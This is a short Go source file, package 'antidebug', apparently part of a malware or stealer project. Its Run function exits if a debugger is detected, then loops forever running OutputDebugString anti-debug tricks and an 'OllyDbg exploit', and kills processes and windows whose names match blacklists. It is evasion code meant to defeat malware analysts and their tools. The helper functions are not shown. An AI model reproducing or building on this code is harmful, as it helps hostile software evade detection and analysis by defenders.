package antidebug

import (
	"os"
)

func Run() {
	if IsDebuggerPresent() {
		os.Exit(0)
	}

	callback := getCallback(WindowTitleBlacklist)
	for {
		OutputDebugStringAntiDebug()
		OutputDebugStringOllyDbgExploit()

		KillProcessesByNames(ProcessNameBlacklist)
		KillProcessesByWindowsNames(callback)
	}
}
